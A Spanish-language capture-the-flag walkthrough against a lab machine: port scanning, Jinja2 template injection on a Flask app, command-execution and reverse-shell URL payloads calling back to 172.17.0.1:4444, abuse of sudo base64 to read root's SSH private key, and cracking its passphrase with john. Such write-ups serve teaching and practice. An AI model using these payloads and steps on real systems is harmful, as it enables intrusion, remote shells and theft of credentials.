### 🔎 1. Reconocimiento

Arranco realizando un escaneo completo de puertos:

```
nmap -p- --open --min-rate 4000 -n -sS -Pn 172.17.0.2 -oG puertos
```

Me encuentra:

22 → SSH
80 → HTTP (Apache default)
8089 → HTTP

Después hago un escaneo más detallado:

nmap -p22,80,8089 -sCV 172.17.0.2 -oN escaneo

Acá ya veo algo interesante:

👉 En el puerto 8089 corre Werkzeug (Python / Flask)

Esto ya me hace sospechar de posibles vulnerabilidades tipo SSTI.

### 🌐 2. Enumeración Web

Entro a:

http://172.17.0.2:8089

Me encuentro con una página bastante simple con un input que dice "Nada interesante que buscar".

👉 Claramente sospechoso.

Veo que el parámetro user se refleja en la página, así que decido probar inyecciones.

### 💣 3. Detección de SSTI

Pruebo un payload básico:

http://172.17.0.2:8089/?user={{7*7}}

Respuesta:

Hola 49

💥 Listo, confirmado → SSTI en Jinja2

🚀 4. Explotación (RCE)

Ahora intento ejecutar comandos:

http://172.17.0.2:8089/?user={{cycler.__init__.__globals__.os.popen('id').read()}}

Respuesta:

uid=1000(verde) gid=1000(verde)

👉 Ya tengo ejecución remota de comandos como el usuario verde.

### 🐚 5. Reverse Shell

Primero levanto listener:

nc -lvnp 4444

Después mando este payload:

http://172.17.0.2:8089/?user={{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261"').read()}}

#### 💡 Importante:
Tuve que usar %26 para el & porque si no la URL se rompía.

👉 Con esto logro una shell como verde.

### 🔍 6. Enumeración interna

Chequeo usuario:

whoami
id

Confirmo que estoy como verde.

Después veo privilegios:

sudo -l

Resultado:

(root) NOPASSWD: /usr/bin/base64

👉 Esto es clave.

### 🔓 7. Escalada de privilegios

Uso base64 para leer archivos como root:

sudo base64 /root/.ssh/id_rsa | base64 -d

👉 Obtengo la clave privada SSH de root.

### 🔐 8. Crackeo de passphrase

Paso la key a john:

ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Resultado:

honda1
### 👑 9. Acceso root

Me conecto por SSH:

ssh -i id_rsa root@172.17.0.2

Ingreso passphrase:

honda1
### 💀 10. Root

Verifico:

whoami
root